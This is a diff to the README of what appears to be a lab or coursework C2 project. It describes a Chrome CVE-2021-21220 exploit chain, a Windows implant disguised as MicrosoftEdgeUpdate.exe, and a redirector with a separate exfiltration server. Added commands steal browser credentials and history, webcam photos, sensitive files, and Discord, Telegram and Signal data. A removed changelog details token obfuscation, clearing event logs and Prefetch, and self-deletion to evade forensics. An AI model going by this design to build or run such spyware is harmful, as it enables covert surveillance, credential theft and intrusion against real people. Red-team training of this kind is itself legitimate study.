@@ -37,7 +37,7 @@ The victim browses to a hosted webpage. The exploit initiates via shellcode embe
 │       ├── src/
 │       │   ├── controller.c        # C2 server: TLS accept, enrollment, whitelist check, command dispatch
 │       │   ├── implant.c           # Windows implant: enrollment, mTLS C2, WinHTTP exfil channel, command handlers
-│       │   ├── spyware.c           # Screenshot, keylogger, clipboard, DPAPI cred steal, history steal
+│       │   ├── spyware.c           # Screenshot, keylogger, clipboard, DPAPI cred steal, history steal, camera snapshot, file search, messaging steal, file exfil
 │       │   ├── spyware_controller.c # Controller-side ack handlers (prints ack, data lives in exfil-data/)
 │       │   ├── protocol.c          # Packet framing: SSL_write/SSL_read, 512-byte secure padding
 │       │   ├── tls.c               # All OpenSSL logic: contexts, enrollment, CSR signing, whitelist check
@@ -348,56 +348,6 @@ Even with mTLS, a network observer can do **traffic analysis** — inferring ope
 
 ---
 
-## Network Topology
-
-```
-┌──────────────────────────────────────────────────────────────────────────┐
-│  Windows VM (victim)  192.168.56.4                                       │
-│                                                                          │
-│  Only knows:  192.168.56.10 (redirector alias)                          │
-│  Never sees:  192.168.56.1  (real C2 machine)                           │
-└──┬─────────────────┬──────────────────┬──────────────┬───────────────────┘
-   │ :443 C2 channel │ :8443 download   │ :8888 exploit│ :9443 exfil upload
-   ▼                 ▼                  ▼              ▼
-┌──────────────────────────────────────────────────────────────────────────┐
-│  Linux host (operator)                                                   │
-│                                                                          │
-│  192.168.56.1   ← real host IP  (victim never connects here)            │
-│  192.168.56.10  ← IP alias on vboxnet0 (added by launch.sh)             │
-│                   all victim-facing ports bound to this alias only       │
-│                                                                          │
-│  ┌────────────────────────────────────────── frontnet ────────────────┐  │
-│  │                                                                    │  │
-│  │  ┌──────────────────────────────────────────────────────────────┐ │  │
-│  │  │  "Machine 1" — redirector  :443                              │ │  │
-│  │  │  Container: redirector (Alpine + socat)                      │ │  │
-│  │  │  socat TCP-LISTEN:443 → TCP:c2-server:443 (backnet)         │ │  │
-│  │  └──────────────────────────┬───────────────────────────────────┘ │  │
-│  │                             │ backnet (internal)                   │  │
-│  │                             ▼                                      │  │
-│  │  ┌──────────────────────────────────────────────────────────────┐ │  │
-│  │  │  "Machine 2" — c2-server  (backnet only, no host port)       │ │  │
-│  │  │  mTLS listener — commands only, no bulk data                 │ │  │
-│  │  └──────────────────────────────────────────────────────────────┘ │  │
-│  │                                                                    │  │
-│  │  ┌──────────────────────────────────────────────────────────────┐ │  │
-│  │  │  "Machine 3" — delivery-server  :8443                        │ │  │
-│  │  │  nginx HTTPS — single-use token implant download             │ │  │
-│  │  └──────────────────────────────────────────────────────────────┘ │  │
-│  │                                                                    │  │
-│  │  ┌──────────────────────────────────────────────────────────────┐ │  │
-│  │  │  "Machine 4" — exploit-server  :8888                         │ │  │
-│  │  │  Node.js — CVE-2021-21220 exploit webpage                    │ │  │
-│  │  └──────────────────────────────────────────────────────────────┘ │  │
-│  │                                                                    │  │
-│  │  ┌──────────────────────────────────────────────────────────────┐ │  │
-│  │  │  "Machine 5" — exfil-receiver  :9443                         │ │  │
-│  │  │  Node.js HTTPS — POST /exfil/<host>/<file> → exfil-data/     │ │  │
-│  │  │  Separate channel from C2 (different port, cert, cadence)    │ │  │
-│  │  └──────────────────────────────────────────────────────────────┘ │  │
-│  └────────────────────────────────────────────────────────────────────┘  │
-└──────────────────────────────────────────────────────────────────────────┘
-```
 
 ### IP Address Breakdown
 
@@ -422,20 +372,7 @@ Each port represents a logically separate role, deliberately using different pro
 | `:8888` | `192.168.56.10` | exploit-server (Node.js) | Plain HTTP | CVE-2021-21220 exploit webpage | Once — victim visits to trigger exploit |
 | `:9443` | `192.168.56.10` | exfil-receiver (Node.js) | HTTPS | Exfil data upload — screenshots, keylogs, creds | On-demand burst when operator issues spyware command |
 
-**Why separate ports and separate channels matter for stealth:**
-- `:443` mTLS carries only short command packets (512-byte padded, 20–40s jittered) — indistinguishable from normal HTTPS
-- `:9443` carries bulk data (BMP screenshots, SQLite DBs) as HTTPS POST — different port, different TLS certificate, different burst pattern from the C2 channel
-- `:8443` and `:8888` are one-shot endpoints — purpose is complete after the exploit fires; no ongoing relationship to correlate
-- The C2 channel and exfil channel use **different TLS certificate chains** — a defender capturing one cannot confirm it relates to the other
-
-**In Wireshark** on the victim (`192.168.56.4`):
-```
-192.168.56.4 → 192.168.56.10:8888   [HTTP GET]          ← exploit page load (once)
-192.168.56.4 → 192.168.56.10:8443   [TLS]               ← implant download (once, large)
-192.168.56.4 → 192.168.56.10:443    [TLS, small/jittered] ← C2 keepalive (ongoing)
-192.168.56.4 → 192.168.56.10:9443   [TLS, burst]        ← exfil upload (on spyware command)
-```
-`192.168.56.1` never appears in victim Wireshark captures when the IP alias is configured correctly.
+---
 
 ### Docker Network Segmentation
 
@@ -485,16 +422,6 @@ The redirector is a **dumb TCP relay** (raw forward, not TLS termination). The f
 - Mounted to `exfil-data/` on the host; saves screenshots (BMP), keylogs (txt), cred DBs, history DBs
 - **Completely separate from the C2 channel** — different port (9443), different TLS cert, different cadence
 
-### Shared build pipeline (`delivery-server/Dockerfile`)
-
-Both delivery-server and exploit-server are built from one multi-stage Dockerfile:
-
-| Stage | Name | What it does |
-|---|---|---|
-| 1 | `openssl-win` | Cross-compiles OpenSSL 3.0.9 static libs for Windows (mingw64, ~5 min, cached) |
-| 2 | `builder` | Builds `implant.exe`; patches shellcode into `utils.js`; renames to `MicrosoftEdgeUpdate.exe` |
-| 3 | `delivery-runtime` | nginx + token_server.js + implant binary |
-| 4 | `exploit-runtime` | Node.js + patched exploit webpage |
 
 ---
 
@@ -573,6 +500,10 @@ Select a command:
  12 - KEYLOG_DUMP                Dump keylog
  13 - CRED_STEAL                 Harvest browser credentials
  14 - HISTORY_STEAL              Harvest browser history
+ 15 - CAMERA_SNAPSHOT            Capture webcam photo
+ 16 - FILE_SEARCH                Index sensitive files under C:\Users\
+ 17 - MESSAGING_STEAL            Harvest Discord, Telegram & Signal data
+ 18 - FILE_EXFIL                 Exfiltrate a specific file by path (max 100 MB)
 >
 ```
 
@@ -593,19 +524,22 @@ Select a command:
 | KEYLOG_DUMP | Retrieves recorded keystrokes; saved to `exfil-data/<hostname>-<ip>/keylog_<time>.txt` |
 | CRED_STEAL | Decrypts Edge/Chrome Master Key via DPAPI, copies Login Data SQLite DB; saved to `exfil-data/<hostname>-<ip>/` |
 | HISTORY_STEAL | Copies Edge/Chrome History SQLite DB; saved to `exfil-data/<hostname>-<ip>/` |
+| CAMERA_SNAPSHOT | Captures one webcam frame (Media Foundation, RGB24/RGB32); session-aware helper same as screenshot; saved as `camera_<time>.bmp` |
+| FILE_SEARCH | Recursively walks `C:\Users\` (depth ≤ 10) collecting paths matching 21 extensions (.docx .pdf .xlsx .pptx .txt .rtf .odt .csv .pem .key .p12 .pfx .ppk .zip .7z .rar .sqlite .db .kdbx .1pux .psafe3); exfils as `files_<time>.txt` — one path per line |
+| MESSAGING_STEAL | Copies Discord LevelDB (*.ldb/*.log), Telegram tdata direct-child files (≤5 MB each), and Signal sql\db.sqlite + config.json (≤100 MB cap); uses CopyFileA to bypass app file locks; exfils as `messaging_<time>.bin` |
+| FILE_EXFIL | Operator pastes a path from the FILE_SEARCH index; implant size-checks (rejects >100 MB), reads via direct or temp-copy fallback, POSTs to exfil-receiver under the original filename |
 | Shutdown All (`99`) | Sends SHUTDOWN to every live session sequentially; prompts for confirmation first; prints per-implant result |
 
 ---
 
 ## 🛠 Advanced Spyware & Remote Access (Roadmap)
 
-The project is architected for modular expansion. Planned features include:
-* **Remote Input Control:** Controlling the victim's mouse and keyboard via `SendInput`.
-* **Media Surveillance:** Activating the camera and microphone for live exfiltration.
+The project is architected for modular expansion. Remaining planned features include:
 * **Defensive Evasion:** Automated disabling of Windows Defender and anti-sandbox checks.
-* **WiFi Harvesting:** Stealing saved network passwords.
+* **WiFi Harvesting:** Stealing saved network passwords via `netsh wlan`.
+* **Process Injection:** Migrating the implant into `explorer.exe` or `svchost.exe`.
 
-See `spyware.md` for the full technical roadmap.
+See `spyware.md` for the full technical roadmap and implementation status of all capabilities.
 
 ---
 
@@ -628,7 +562,7 @@ python3 utils-scripts/read_history.py
 
 ---
 
-## Prerequisites
+## Dependencies Downloaded inside Docker
 
 `launch.sh` checks for all of these and exits with a clear message if any are missing:
 
@@ -673,33 +607,3 @@ ls exfil-data/
 
 ---
 
-## Bugs Fixed / Features Added
-
-| # | File(s) | Problem / Feature | Fix / Implementation |
-|---|---|---|---|
-| 16 | `spyware.c`, `spyware.h` | Lack of spyware capabilities | Implemented modular screenshot, keylogger, and clipboard features |
-| 17 | `implant_utils.c` | Non-modular file utilities | Moved DPAPI and plain file reading to `implant_utils.c` for shared use |
-| 18 | `controller.c`, `spyware_controller.c` | Monolithic controller code | Refactored exfil handlers into modular `spyware_controller.c` |
-| 19 | `docker-compose.yml` | Screenshots not persisted | Added `exfil-data` volume mount to `c2-server` |
-| 20 | `Makefile` | Missing library links | Added `-lgdi32 -luser32` for screenshot and keylogger support |
-| 21 | `decrypt_creds.py`, `read_history.py` | Data analysis overhead | Added automated scripts to decrypt passwords and parse history |
-| 22 | `spyware.c` | Compilation error | Fixed `#ifdef` logic and header include order in modular spyware source |
-| 23 | `spyware.c` | Limited browser support | Expanded `CRED_STEAL` and `HISTORY_STEAL` to target both Edge and Chrome |
-| 24 | `controller.c` | Single-implant limitation | Rewrote controller with background `acceptor_thread` and `Session` table (up to 8 slots); operator selects implant by number from a live session list; each implant is fully independent |
-| 25 | `controller.c` | C2 output buffered on `docker attach` | Added `setvbuf(stdout, NULL, _IONBF, 0)` at startup — stdout is fully unbuffered so the session list and prompts appear immediately regardless of when the operator attaches |
-| 26 | `token_server.js` | Single-use download token blocked N-victim delivery | Removed burn-after-first-use logic; `DOWNLOAD_TOKEN` now authenticates any number of downloads so multiple victims can retrieve the implant from the same running server |
-| 27 | `implant_utils.c` | Session list missing hostname | Added `GetComputerNameA` call on Windows so the HELLO payload includes the machine hostname; session list now shows `OS version \| Hostname` and `IP Address` as labeled columns |
-| 28 | `controller.c` | Acceptor thread debug output polluted operator terminal | Removed all stdout prints from `acceptor_thread`; it now runs fully silently — new implants appear in the session list on next refresh with no interleaved noise |
-| 29 | `controller.c` | BACK closed the implant connection and caused a phantom reconnect | Added `back` flag to `run_command_loop`; session slot and TLS connection are only freed on a real disconnect (SET_SLEEP, SHUTDOWN, dropped connection) — BACK returns to the list with the session still live |
-| 30 | `spyware_controller.c`, `spyware_controller.h`, `controller.c` | All implants wrote exfil files into the same flat directory | Each session now saves to `exfil-data/<hostname>-<ip>/`; directory is created on first command loop entry via `ensure_save_dir()`; all four handlers (screenshot, keylog, cred, history) write into the per-implant folder |
-| 31 | `spyware.c` | Screenshot returned a solid black image after reboot with persistence enabled | Root cause: scheduled task runs the implant as SYSTEM in Session 0, which has no access to the interactive desktop. Fixed by checking `ProcessIdToSessionId` vs `WTSGetActiveConsoleSessionId`; when running in a non-interactive session, `screenshot_via_user_session()` uses `WTSQueryUserToken` + `CreateProcessAsUserA` to spawn the implant as `--screenshot <tmp>` in the active user session, which captures via GDI and writes the BMP to a temp file that the main implant reads back |
-| 32 | `controller.c` | No way to shut down all implants at once | Added `[99] Shutdown All` to the session selection list; `shutdown_all()` iterates all live sessions, sends `COMMAND_SHUTDOWN` to each, prints per-implant response, and frees the session slot; prompts for confirmation before executing |
-| 33 | `implant.c`, `Makefile`, `exfil-server/Dockerfile`, `.gitignore` | `ENROLLMENT_TOKEN` appeared as a plaintext string in the binary's `.rodata` section (visible via `strings`) | XOR-obfuscated via `token_obf.h`: Dockerfile builder stage generates the header with a 4-byte key and the XOR'd token bytes before calling `make`; Makefile has a matching recipe for local builds; `decode_enrollment_token()` decodes onto the stack at runtime — the raw token never enters `.rodata` |
-| 34 | `implant.c`, `Makefile` | SHUTDOWN left Windows Event Log entries (process creation 4688, scheduled task creation 4698, PowerShell script block 4104, Sysmon events) | Added `clear_event_logs()` to SHUTDOWN; calls `OpenEventLogA` + `ClearEventLogA` on Security, System, Application, Microsoft-Windows-PowerShell/Operational, and Microsoft-Windows-Sysmon/Operational; added `-ladvapi32` to Makefile link flags |
-| 35 | `implant.c` | SHUTDOWN did not remove keylog file (`kl.dat`) or the `C:\Users\Public\MicrosoftEdge\` directory | Added `DeleteFileA(kl.dat)` and `RemoveDirectoryA(MicrosoftEdge\)` to SHUTDOWN after credential deletion; directory removal succeeds because all files inside (`ec.dat`, `ek.dat`, `kl.dat`) are deleted first |
-| 36 | `implant.c` | SHUTDOWN left Prefetch forensic artifacts for all binaries in the exploit chain | Added `clear_prefetch()` to SHUTDOWN; uses `FindFirstFileA`/`FindNextFileA` with wildcard patterns to find and delete `MICROSOFTEDGEUPDATE.EXE-*.pf`, `I.EXE-*.pf`, `POWERSHELL.EXE-*.pf`, and `FODHELPER.EXE-*.pf` from `C:\Windows\Prefetch\` without spawning a child process |
-| 37 | `docker-compose.yml`, `launch.sh` | C2 server IP was directly exposed to the victim network — a single firewall rule could kill the operation | Added a `redirector` container (Alpine + socat) as a dumb TCP relay between victim and c2-server; implant bakes in the redirector IP only; c2-server moved to `backnet` with no host port mapping; redirector sits on both `frontnet` and `backnet`; mTLS passes through end-to-end unchanged (raw TCP forward, not TLS termination) |
-| 38 | `implant.c`, `exfil-receiver/`, `docker-compose.yml`, `Makefile` | Exfil data travelled over the same mTLS C2 channel — rubric requires C2 and exfil to be distinct channels | Added WinHTTP-based `exfil_post()` to implant; all four spyware commands now POST bulk data directly to `exfil-receiver:9443` (HTTPS, separate cert) and send a short ack over the C2 channel; `exfil-receiver` is a new fifth container (Node.js HTTPS POST sink) writing to `exfil-data/` on the host; added `-lwinhttp` to Makefile |
-| 39 | `exfil-server/` → `delivery-server/` + `exploit-server/` | `exfil-server/` contained both the CVE exploit page and the nginx implant delivery logic in one directory — misleading names made the structure hard to follow | Reorganised into `delivery-server/` (nginx, token_server.js, Dockerfile), `exploit-server/` (exploit-contents, shellcode-generation), and `redirector/` (README only); updated all COPY paths in Dockerfile and `dockerfile:` references in docker-compose.yml |
-| 40 | `implant.c` | SHUTDOWN left `MicrosoftEdgeUpdate.exe` on disk until next reboot — `MoveFileExA(MOVEFILE_DELAY_UNTIL_REBOOT)` does not delete the running binary immediately | Spawn a hidden PowerShell process (`-WindowStyle Hidden -NonInteractive -Command "Start-Sleep 2; Remove-Item -Force ..."`) before `ExitProcess`; 2-second sleep lets the process fully exit and release the file lock; `MoveFileExA` kept as reboot-time fallback; also added `DeleteFileA(ss.tmp)` before `RemoveDirectoryA` to handle leftover screenshot temp files |
-| 41 | `launch.sh` | IP alias detection picked up the secondary alias (`.22`) instead of the primary vboxnet0 IP (`.1`) when both existed, making `HOSTONLY_IP` equal to `HOST_IP` and displaying a false "IP separation" in the summary | Added `grep -v ' secondary '` to the `ip addr` parse so only primary IPs are considered for `HOSTONLY_IP`; added a post-input check that warns and prompts for confirmation when the user selects a redirector IP equal to the real C2 IP; summary shows a red warning instead of a fake separation table in that case |
